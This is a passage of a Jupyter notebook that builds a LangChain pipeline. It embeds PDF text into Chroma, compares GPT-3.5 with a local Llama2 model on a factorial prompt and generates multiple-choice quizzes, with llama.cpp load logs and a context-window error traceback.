    "# print(f\"Vector count: {len(vectors)}\")\n",
    "# db = Chroma.from_documents(docs, embedding=embeddings)\n",
    "\n",
    "if not os.path.exists(os.path.join(os.getcwd(), \"vectorstores\")):\n",
    "    os.makedirs(os.path.join(os.getcwd(), \"vectorstores\"))\n",
    "with get_openai_callback() as cb:\n",
    "    # db = Chroma.from_documents(persist_directory=\"./vectorstores\", documents=docs, embedding=embeddings)\n",
    "    db = Chroma.from_documents(documents=docs, embedding=embeddings)\n",
    "    print(\"Callback:\\n\", cb)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Interact with LLM"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Load LLM"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I have tried to run llama2 through llama.cpp on Mac, but it works worse than GPT. It has limits of 4096 tokens which is much smaller than GPT. The only way to increase the token limitation is to pretrain the llama2 model with larger context window which is too expensive and not feasible"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Output for \"Write a python program to calculate the factorial of a number.\"\n",
    "\n",
    "GPT3.5 output:\n",
    "    content='Here\\'s a simple Python program to calculate the factorial of a number using a recursive function:\\n\\n```python\\ndef factorial(n):\\n    if n == 0 or n == 1:\\n        return 1\\n    else:\\n        return n * factorial(n-1)\\n\\nnum = int(input(\"Enter a number: \"))\\nprint(\"Factorial of\", num, \"is\", factorial(num))\\n```\\n\\nWhen you run this program, it will prompt you to enter a number, then it will calculate and print the factorial of that number.'\n",
    "\n",
    "Llama2-7B output (This is the best output after I tried several times): \n",
    "    Factorials are defined in terms of multiplication. The factorial of n is the product of all integers from 1 to n. For example, the factorial of 4 is the product of 1×2×3×4 or 24. The factorial of 5 is the product of 1×2×3×4×5 or 120. Factorials can be calculated using recursion as follows:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "llama_model_loader: loaded meta data with 16 key-value pairs and 363 tensors from llama.cpp/models/llama2-13B/ggml-model-q4_0.bin (version GGUF V3 (latest))\n",
      "llama_model_loader: Dumping metadata keys/values. Note: KV overrides do not apply in this output.\n",
      "llama_model_loader: - kv   0:                       general.architecture str              = llama\n",
      "llama_model_loader: - kv   1:                               general.name str              = LLaMA v2\n",
      "llama_model_loader: - kv   2:                       llama.context_length u32              = 4096\n",
      "llama_model_loader: - kv   3:                     llama.embedding_length u32              = 5120\n",
      "llama_model_loader: - kv   4:                          llama.block_count u32              = 40\n",
      "llama_model_loader: - kv   5:                  llama.feed_forward_length u32              = 13824\n",
      "llama_model_loader: - kv   6:                 llama.rope.dimension_count u32              = 128\n",
      "llama_model_loader: - kv   7:                 llama.attention.head_count u32              = 40\n",
      "llama_model_loader: - kv   8:              llama.attention.head_count_kv u32              = 40\n",
      "llama_model_loader: - kv   9:     llama.attention.layer_norm_rms_epsilon f32              = 0.000010\n",
      "llama_model_loader: - kv  10:                          general.file_type u32              = 2\n",
      "llama_model_loader: - kv  11:                       tokenizer.ggml.model str              = llama\n",
      "llama_model_loader: - kv  12:                      tokenizer.ggml.tokens arr[str,32000]   = [\"<unk>\", \"<s>\", \"</s>\", \"<0x00>\", \"<...\n",
      "llama_model_loader: - kv  13:                      tokenizer.ggml.scores arr[f32,32000]   = [0.000000, 0.000000, 0.000000, 0.0000...\n",
      "llama_model_loader: - kv  14:                  tokenizer.ggml.token_type arr[i32,32000]   = [2, 3, 3, 6, 6, 6, 6, 6, 6, 6, 6, 6, ...\n",
      "llama_model_loader: - kv  15:               general.quantization_version u32              = 2\n",
      "llama_model_loader: - type  f32:   81 tensors\n",
      "llama_model_loader: - type q4_0:  281 tensors\n",
      "llama_model_loader: - type q6_K:    1 tensors\n",
      "llm_load_vocab: special tokens definition check successful ( 259/32000 ).\n",
      "llm_load_print_meta: format           = GGUF V3 (latest)\n",
      "llm_load_print_meta: arch             = llama\n",
      "llm_load_print_meta: vocab type       = SPM\n",
      "llm_load_print_meta: n_vocab          = 32000\n",
      "llm_load_print_meta: n_merges         = 0\n",
      "llm_load_print_meta: n_ctx_train      = 4096\n",
      "llm_load_print_meta: n_embd           = 5120\n",
      "llm_load_print_meta: n_head           = 40\n",
      "llm_load_print_meta: n_head_kv        = 40\n",
      "llm_load_print_meta: n_layer          = 40\n",
      "llm_load_print_meta: n_rot            = 128\n",
      "llm_load_print_meta: n_embd_head_k    = 128\n",
      "llm_load_print_meta: n_embd_head_v    = 128\n",
      "llm_load_print_meta: n_gqa            = 1\n",
      "llm_load_print_meta: n_embd_k_gqa     = 5120\n",
      "llm_load_print_meta: n_embd_v_gqa     = 5120\n",
      "llm_load_print_meta: f_norm_eps       = 0.0e+00\n",
      "llm_load_print_meta: f_norm_rms_eps   = 1.0e-05\n",
      "llm_load_print_meta: f_clamp_kqv      = 0.0e+00\n",
      "llm_load_print_meta: f_max_alibi_bias = 0.0e+00\n",
      "llm_load_print_meta: n_ff             = 13824\n",
      "llm_load_print_meta: n_expert         = 0\n",
      "llm_load_print_meta: n_expert_used    = 0\n",
      "llm_load_print_meta: rope scaling     = linear\n",
      "llm_load_print_meta: freq_base_train  = 10000.0\n",
      "llm_load_print_meta: freq_scale_train = 1\n",
      "llm_load_print_meta: n_yarn_orig_ctx  = 4096\n",
      "llm_load_print_meta: rope_finetuned   = unknown\n",
      "llm_load_print_meta: model type       = 13B\n",
      "llm_load_print_meta: model ftype      = Q4_0\n",
      "llm_load_print_meta: model params     = 13.02 B\n",
      "llm_load_print_meta: model size       = 6.86 GiB (4.53 BPW) \n",
      "llm_load_print_meta: general.name     = LLaMA v2\n",
      "llm_load_print_meta: BOS token        = 1 '<s>'\n",
      "llm_load_print_meta: EOS token        = 2 '</s>'\n",
      "llm_load_print_meta: UNK token        = 0 '<unk>'\n",
      "llm_load_print_meta: LF token         = 13 '<0x0A>'\n",
      "llm_load_tensors: ggml ctx size =    0.28 MiB\n",
      "ggml_backend_metal_buffer_from_ptr: allocated buffer, size =   680.80 MiB, (  680.86 / 10922.67)\n",
      "llm_load_tensors: offloading 4 repeating layers to GPU\n",
      "llm_load_tensors: offloaded 4/41 layers to GPU\n",
      "llm_load_tensors:        CPU buffer size =  6343.12 MiB\n",
      "llm_load_tensors:      Metal buffer size =   680.79 MiB\n",
      "...................................................................................................\n",
      "llama_new_context_with_model: n_ctx      = 4096\n",
      "llama_new_context_with_model: freq_base  = 10000.0\n",
      "llama_new_context_with_model: freq_scale = 1\n",
      "ggml_metal_init: allocating\n",
      "ggml_metal_init: found device: Apple M2 Pro\n",
      "ggml_metal_init: picking default device: Apple M2 Pro\n",
      "ggml_metal_init: default.metallib not found, loading from source\n",
      "ggml_metal_init: GGML_METAL_PATH_RESOURCES = nil\n",
      "ggml_metal_init: loading '/Users/haoxu/anaconda3/lib/python3.11/site-packages/llama_cpp/ggml-metal.metal'\n",
      "ggml_metal_init: GPU name:   Apple M2 Pro\n",
      "ggml_metal_init: GPU family: MTLGPUFamilyApple8  (1008)\n",
      "ggml_metal_init: GPU family: MTLGPUFamilyCommon3 (3003)\n",
      "ggml_metal_init: GPU family: MTLGPUFamilyMetal3  (5001)\n",
      "ggml_metal_init: simdgroup reduction support   = true\n",
      "ggml_metal_init: simdgroup matrix mul. support = true\n",
      "ggml_metal_init: hasUnifiedMemory              = true\n",
      "ggml_metal_init: recommendedMaxWorkingSetSize  = 11453.25 MB\n",
      "llama_kv_cache_init:        CPU KV buffer size =  2880.00 MiB\n",
      "ggml_backend_metal_buffer_type_alloc_buffer: allocated buffer, size =   320.00 MiB, ( 1002.67 / 10922.67)\n",
      "llama_kv_cache_init:      Metal KV buffer size =   320.00 MiB\n",
      "llama_new_context_with_model: KV self size  = 3200.00 MiB, K (f16): 1600.00 MiB, V (f16): 1600.00 MiB\n",
      "llama_new_context_with_model:        CPU input buffer size   =   208.08 MiB\n",
      "ggml_backend_metal_buffer_type_alloc_buffer: allocated buffer, size =  2944.03 MiB, ( 3946.70 / 10922.67)\n",
      "llama_new_context_with_model:      Metal compute buffer size =  2944.03 MiB\n",
      "llama_new_context_with_model:        CPU compute buffer size =  2960.00 MiB\n",
      "llama_new_context_with_model: graph splits (measure): 5\n",
      "AVX = 0 | AVX_VNNI = 0 | AVX2 = 0 | AVX512 = 0 | AVX512_VBMI = 0 | AVX512_VNNI = 0 | FMA = 0 | NEON = 1 | ARM_FMA = 1 | F16C = 0 | FP16_VA = 1 | WASM_SIMD = 0 | BLAS = 1 | SSE3 = 0 | SSSE3 = 0 | VSX = 0 | MATMUL_INT8 = 0 | \n",
      "Model metadata: {'general.quantization_version': '2', 'tokenizer.ggml.model': 'llama', 'llama.attention.head_count_kv': '40', 'llama.context_length': '4096', 'llama.attention.head_count': '40', 'llama.rope.dimension_count': '128', 'general.file_type': '2', 'llama.feed_forward_length': '13824', 'llama.embedding_length': '5120', 'llama.block_count': '40', 'general.architecture': 'llama', 'llama.attention.layer_norm_rms_epsilon': '0.000010', 'general.name': 'LLaMA v2'}\n"
     ]
    }
   ],
   "source": [
    "from langchain_openai import ChatOpenAI\n",
    "from langchain_community.llms import HuggingFaceHub\n",
    "from langchain_community.llms import LlamaCpp\n",
    "\n",
    "# llm = ChatOpenAI(model_name='gpt-4-1106-preview')\n",
    "llm = ChatOpenAI(model_name='gpt-3.5-turbo-1106')\n",
    "# llm = HuggingFaceHub(repo_id=\"google/flan-t5-xxl\", model_kwargs={\"temperature\":0.5, \"max_length\":512})\n",
    "# llm = LlamaCpp(model_path=\"llama.cpp/models/llama2-13B/ggml-model-q4_0.bin\", n_gpu_layers=4, n_batch=4096, f16_kv=True, n_ctx=4096)\n",
    "\n",
    "# llm.get_num_tokens([x.page_content for x in docs])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Llama.generate: prefix-match hit\n",
      "\n",
      "llama_print_timings:        load time =   13737.17 ms\n",
      "llama_print_timings:      sample time =      17.37 ms /    94 runs   (    0.18 ms per token,  5411.63 tokens per second)\n",
      "llama_print_timings: prompt eval time =       0.00 ms /     1 tokens (    0.00 ms per token,      inf tokens per second)\n",
      "llama_print_timings:        eval time = 1231019.43 ms /    94 runs   (13095.95 ms per token,     0.08 tokens per second)\n",
      "llama_print_timings:       total time = 1231703.36 ms /    95 tokens\n"
     ]
    }
   ],
   "source": [
    "result = llm.invoke(\"Write a python program to calculate the factorial of a number.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Factorials are defined in terms of multiplication. The factorial of n is the product of all integers from 1 to n. For example, the factorial of 4 is the product of 1×2×3×4 or 24. The factorial of 5 is the product of 1×2×3×4×5 or 120. Factorials can be calculated using recursion as follows:\n"
     ]
    }
   ],
   "source": [
    "print(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Langchain summarize chain to generate quiz"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Stuff"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from langchain.chains.summarize import load_summarize_chain\n",
    "from langchain import PromptTemplate\n",
    "from langchain.callbacks import get_openai_callback\n",
    "\n",
    "# templete = \"\"\"\n",
    "# Extract key points which can help students revise from the following text delimited by triple backquotes.\n",
    "# Return your response in bullet points which covers the key points of the text.\n",
    "# ```{text}```\n",
    "# BULLET POINT SUMMARY:\n",
    "# \"\"\"\n",
    "\n",
    "templete = \"\"\"\n",
    "Using the content provided below from a PDF delimited by triple backquotes, \n",
    "please generate a multiple-choice test consisting of 3 questions to aid students in their review. \n",
    "Each question should be related to the key concepts, facts, or information in the text, and following the specific format below:\n",
    "Begin each question with the word \"Question\" and a number, followed by a colon.\n",
    "Then, provide the options for the question beginning with the word \"Options\" and a colon.\n",
    "Ensure that for each question, there is one correct answer and three plausible but incorrect options. \n",
    "End each question with the word \"Answer\" and a colon, followed by the correct answer.\n",
    "\n",
    "```{text}```\n",
    "\"\"\"\n",
    "\n",
    "prompt = PromptTemplate(\n",
    "    input_variables=[\"text\"],\n",
    "    template=templete,\n",
    ")\n",
    "\n",
    "summary_chain = load_summarize_chain(llm, \n",
    "                                     chain_type=\"stuff\", \n",
    "                                     prompt=prompt, \n",
    "                                     verbose=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# summary_list = []\n",
    "# for i, doc in enumerate(docs):\n",
    "#     print(f\"Processing document {i}...\")\n",
    "#     print(f\"This doc has {llm.get_num_tokens(doc.page_content)} tokens.\")\n",
    "#     print(f\"This doc has {len(doc.page_content)} characters. {len(doc.page_content) / llm.get_num_tokens(doc.page_content)} characters per token.\")\n",
    "#     with get_openai_callback() as cb:\n",
    "#         chunk_summary = summary_chain.invoke([doc])\n",
    "#         print(f\"Callback: \\n{cb}\")\n",
    "#     summary_list.append(chunk_summary)\n",
    "#     print(f\"Summary #{i} is: {chunk_summary}\\n\")\n",
    "#     break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing document ...\n",
      "This doc has 4394 tokens.\n",
      "This doc has 17998 characters. 4.0960400546199365 characters per token.\n"
     ]
    },
    {
     "ename": "ValueError",
     "evalue": "Requested tokens (4551) exceed context window of 512",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mValueError\u001b[0m                                Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[14], line 5\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mThis doc has \u001b[39m\u001b[38;5;132;01m{\u001b[39;00m\u001b[38;5;28mlen\u001b[39m(pdfs[\u001b[38;5;241m0\u001b[39m]\u001b[38;5;241m.\u001b[39mpage_content)\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m characters. \u001b[39m\u001b[38;5;132;01m{\u001b[39;00m\u001b[38;5;28mlen\u001b[39m(pdfs[\u001b[38;5;241m0\u001b[39m]\u001b[38;5;241m.\u001b[39mpage_content)\u001b[38;5;250m \u001b[39m\u001b[38;5;241m/\u001b[39m\u001b[38;5;250m \u001b[39mllm\u001b[38;5;241m.\u001b[39mget_num_tokens(pdfs[\u001b[38;5;241m0\u001b[39m]\u001b[38;5;241m.\u001b[39mpage_content)\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m characters per token.\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n\u001b[1;32m      4\u001b[0m \u001b[38;5;28;01mwith\u001b[39;00m get_openai_callback() \u001b[38;5;28;01mas\u001b[39;00m cb:\n\u001b[0;32m----> 5\u001b[0m     summary \u001b[38;5;241m=\u001b[39m summary_chain\u001b[38;5;241m.\u001b[39minvoke(pdfs)\n\u001b[1;32m      6\u001b[0m     \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mCallback: \u001b[39m\u001b[38;5;130;01m\\n\u001b[39;00m\u001b[38;5;132;01m{\u001b[39;00mcb\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m)\n\u001b[1;32m      7\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mSummary is: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00msummary\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;130;01m\\n\u001b[39;00m\u001b[38;5;124m\"\u001b[39m)\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain/chains/base.py:162\u001b[0m, in \u001b[0;36mChain.invoke\u001b[0;34m(self, input, config, **kwargs)\u001b[0m\n\u001b[1;32m    160\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mBaseException\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m e:\n\u001b[1;32m    161\u001b[0m     run_manager\u001b[38;5;241m.\u001b[39mon_chain_error(e)\n\u001b[0;32m--> 162\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m e\n\u001b[1;32m    163\u001b[0m run_manager\u001b[38;5;241m.\u001b[39mon_chain_end(outputs)\n\u001b[1;32m    164\u001b[0m final_outputs: Dict[\u001b[38;5;28mstr\u001b[39m, Any] \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mprep_outputs(\n\u001b[1;32m    165\u001b[0m     inputs, outputs, return_only_outputs\n\u001b[1;32m    166\u001b[0m )\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain/chains/base.py:156\u001b[0m, in \u001b[0;36mChain.invoke\u001b[0;34m(self, input, config, **kwargs)\u001b[0m\n\u001b[1;32m    149\u001b[0m run_manager \u001b[38;5;241m=\u001b[39m callback_manager\u001b[38;5;241m.\u001b[39mon_chain_start(\n\u001b[1;32m    150\u001b[0m     dumpd(\u001b[38;5;28mself\u001b[39m),\n\u001b[1;32m    151\u001b[0m     inputs,\n\u001b[1;32m    152\u001b[0m     name\u001b[38;5;241m=\u001b[39mrun_name,\n\u001b[1;32m    153\u001b[0m )\n\u001b[1;32m    154\u001b[0m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[1;32m    155\u001b[0m     outputs \u001b[38;5;241m=\u001b[39m (\n\u001b[0;32m--> 156\u001b[0m         \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_call(inputs, run_manager\u001b[38;5;241m=\u001b[39mrun_manager)\n\u001b[1;32m    157\u001b[0m         \u001b[38;5;28;01mif\u001b[39;00m new_arg_supported\n\u001b[1;32m    158\u001b[0m         \u001b[38;5;28;01melse\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_call(inputs)\n\u001b[1;32m    159\u001b[0m     )\n\u001b[1;32m    160\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mBaseException\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m e:\n\u001b[1;32m    161\u001b[0m     run_manager\u001b[38;5;241m.\u001b[39mon_chain_error(e)\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain/chains/combine_documents/base.py:136\u001b[0m, in \u001b[0;36mBaseCombineDocumentsChain._call\u001b[0;34m(self, inputs, run_manager)\u001b[0m\n\u001b[1;32m    134\u001b[0m \u001b[38;5;66;03m# Other keys are assumed to be needed for LLM prediction\u001b[39;00m\n\u001b[1;32m    135\u001b[0m other_keys \u001b[38;5;241m=\u001b[39m {k: v \u001b[38;5;28;01mfor\u001b[39;00m k, v \u001b[38;5;129;01min\u001b[39;00m inputs\u001b[38;5;241m.\u001b[39mitems() \u001b[38;5;28;01mif\u001b[39;00m k \u001b[38;5;241m!=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39minput_key}\n\u001b[0;32m--> 136\u001b[0m output, extra_return_dict \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mcombine_docs(\n\u001b[1;32m    137\u001b[0m     docs, callbacks\u001b[38;5;241m=\u001b[39m_run_manager\u001b[38;5;241m.\u001b[39mget_child(), \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mother_keys\n\u001b[1;32m    138\u001b[0m )\n\u001b[1;32m    139\u001b[0m extra_return_dict[\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39moutput_key] \u001b[38;5;241m=\u001b[39m output\n\u001b[1;32m    140\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m extra_return_dict\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain/chains/combine_documents/stuff.py:244\u001b[0m, in \u001b[0;36mStuffDocumentsChain.combine_docs\u001b[0;34m(self, docs, callbacks, **kwargs)\u001b[0m\n\u001b[1;32m    242\u001b[0m inputs \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_get_inputs(docs, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs)\n\u001b[1;32m    243\u001b[0m \u001b[38;5;66;03m# Call predict on the LLM.\u001b[39;00m\n\u001b[0;32m--> 244\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mllm_chain\u001b[38;5;241m.\u001b[39mpredict(callbacks\u001b[38;5;241m=\u001b[39mcallbacks, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39minputs), {}\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain/chains/llm.py:293\u001b[0m, in \u001b[0;36mLLMChain.predict\u001b[0;34m(self, callbacks, **kwargs)\u001b[0m\n\u001b[1;32m    278\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mpredict\u001b[39m(\u001b[38;5;28mself\u001b[39m, callbacks: Callbacks \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;01mNone\u001b[39;00m, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs: Any) \u001b[38;5;241m-\u001b[39m\u001b[38;5;241m>\u001b[39m \u001b[38;5;28mstr\u001b[39m:\n\u001b[1;32m    279\u001b[0m \u001b[38;5;250m    \u001b[39m\u001b[38;5;124;03m\"\"\"Format prompt with kwargs and pass to LLM.\u001b[39;00m\n\u001b[1;32m    280\u001b[0m \n\u001b[1;32m    281\u001b[0m \u001b[38;5;124;03m    Args:\u001b[39;00m\n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m    291\u001b[0m \u001b[38;5;124;03m            completion = llm.predict(adjective=\"funny\")\u001b[39;00m\n\u001b[1;32m    292\u001b[0m \u001b[38;5;124;03m    \"\"\"\u001b[39;00m\n\u001b[0;32m--> 293\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28mself\u001b[39m(kwargs, callbacks\u001b[38;5;241m=\u001b[39mcallbacks)[\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39moutput_key]\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain_core/_api/deprecation.py:145\u001b[0m, in \u001b[0;36mdeprecated.<locals>.deprecate.<locals>.warning_emitting_wrapper\u001b[0;34m(*args, **kwargs)\u001b[0m\n\u001b[1;32m    143\u001b[0m     warned \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;01mTrue\u001b[39;00m\n\u001b[1;32m    144\u001b[0m     emit_warning()\n\u001b[0;32m--> 145\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m wrapped(\u001b[38;5;241m*\u001b[39margs, \u001b[38;5;241m*\u001b[39m\u001b[38;5;241m*\u001b[39mkwargs)\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain/chains/base.py:363\u001b[0m, in \u001b[0;36mChain.__call__\u001b[0;34m(self, inputs, return_only_outputs, callbacks, tags, metadata, run_name, include_run_info)\u001b[0m\n\u001b[1;32m    331\u001b[0m \u001b[38;5;250m\u001b[39m\u001b[38;5;124;03m\"\"\"Execute the chain.\u001b[39;00m\n\u001b[1;32m    332\u001b[0m \n\u001b[1;32m    333\u001b[0m \u001b[38;5;124;03mArgs:\u001b[39;00m\n\u001b[0;32m   (...)\u001b[0m\n\u001b[1;32m    354\u001b[0m \u001b[38;5;124;03m        `Chain.output_keys`.\u001b[39;00m\n\u001b[1;32m    355\u001b[0m \u001b[38;5;124;03m\"\"\"\u001b[39;00m\n\u001b[1;32m    356\u001b[0m config \u001b[38;5;241m=\u001b[39m {\n\u001b[1;32m    357\u001b[0m     \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mcallbacks\u001b[39m\u001b[38;5;124m\"\u001b[39m: callbacks,\n\u001b[1;32m    358\u001b[0m     \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mtags\u001b[39m\u001b[38;5;124m\"\u001b[39m: tags,\n\u001b[1;32m    359\u001b[0m     \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mmetadata\u001b[39m\u001b[38;5;124m\"\u001b[39m: metadata,\n\u001b[1;32m    360\u001b[0m     \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mrun_name\u001b[39m\u001b[38;5;124m\"\u001b[39m: run_name,\n\u001b[1;32m    361\u001b[0m }\n\u001b[0;32m--> 363\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39minvoke(\n\u001b[1;32m    364\u001b[0m     inputs,\n\u001b[1;32m    365\u001b[0m     cast(RunnableConfig, {k: v \u001b[38;5;28;01mfor\u001b[39;00m k, v \u001b[38;5;129;01min\u001b[39;00m config\u001b[38;5;241m.\u001b[39mitems() \u001b[38;5;28;01mif\u001b[39;00m v \u001b[38;5;129;01mis\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m}),\n\u001b[1;32m    366\u001b[0m     return_only_outputs\u001b[38;5;241m=\u001b[39mreturn_only_outputs,\n\u001b[1;32m    367\u001b[0m     include_run_info\u001b[38;5;241m=\u001b[39minclude_run_info,\n\u001b[1;32m    368\u001b[0m )\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain/chains/base.py:162\u001b[0m, in \u001b[0;36mChain.invoke\u001b[0;34m(self, input, config, **kwargs)\u001b[0m\n\u001b[1;32m    160\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mBaseException\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m e:\n\u001b[1;32m    161\u001b[0m     run_manager\u001b[38;5;241m.\u001b[39mon_chain_error(e)\n\u001b[0;32m--> 162\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m e\n\u001b[1;32m    163\u001b[0m run_manager\u001b[38;5;241m.\u001b[39mon_chain_end(outputs)\n\u001b[1;32m    164\u001b[0m final_outputs: Dict[\u001b[38;5;28mstr\u001b[39m, Any] \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mprep_outputs(\n\u001b[1;32m    165\u001b[0m     inputs, outputs, return_only_outputs\n\u001b[1;32m    166\u001b[0m )\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain/chains/base.py:156\u001b[0m, in \u001b[0;36mChain.invoke\u001b[0;34m(self, input, config, **kwargs)\u001b[0m\n\u001b[1;32m    149\u001b[0m run_manager \u001b[38;5;241m=\u001b[39m callback_manager\u001b[38;5;241m.\u001b[39mon_chain_start(\n\u001b[1;32m    150\u001b[0m     dumpd(\u001b[38;5;28mself\u001b[39m),\n\u001b[1;32m    151\u001b[0m     inputs,\n\u001b[1;32m    152\u001b[0m     name\u001b[38;5;241m=\u001b[39mrun_name,\n\u001b[1;32m    153\u001b[0m )\n\u001b[1;32m    154\u001b[0m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[1;32m    155\u001b[0m     outputs \u001b[38;5;241m=\u001b[39m (\n\u001b[0;32m--> 156\u001b[0m         \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_call(inputs, run_manager\u001b[38;5;241m=\u001b[39mrun_manager)\n\u001b[1;32m    157\u001b[0m         \u001b[38;5;28;01mif\u001b[39;00m new_arg_supported\n\u001b[1;32m    158\u001b[0m         \u001b[38;5;28;01melse\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_call(inputs)\n\u001b[1;32m    159\u001b[0m     )\n\u001b[1;32m    160\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mBaseException\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m e:\n\u001b[1;32m    161\u001b[0m     run_manager\u001b[38;5;241m.\u001b[39mon_chain_error(e)\n",
      "File \u001b[0;32m~/anaconda3/lib/python3.11/site-packages/langchain/chains/llm.py:103\u001b[0m, in \u001b[0;36mLLMChain._call\u001b[0;34m(self, inputs, run_manager)\u001b[0m\n\u001b[1;32m     98\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21m_call\u001b[39m(\n\u001b[1;32m     99\u001b[0m     \u001b[38;5;28mself\u001b[39m,\n\u001b[1;32m    100\u001b[0m     inputs: Dict[\u001b[38;5;28mstr\u001b[39m, Any],\n\u001b[1;32m    101\u001b[0m     run_manager: Optional[CallbackManagerForChainRun] \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;01mNone\u001b[39;00m,\n\u001b[1;32m    102\u001b[0m ) \u001b[38;5;241m-\u001b[39m\u001b[38;5;241m>\u001b[39m Dict[\u001b[38;5;28mstr\u001b[39m, \u001b[38;5;28mstr\u001b[39m]:\n\u001b[0;32m--> 103\u001b[0m     response \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mgenerate([inputs], run_manager\u001b[38;5;241m=\u001b[39mrun_manager)\n\u001b[1;32m    104\u001b[0m     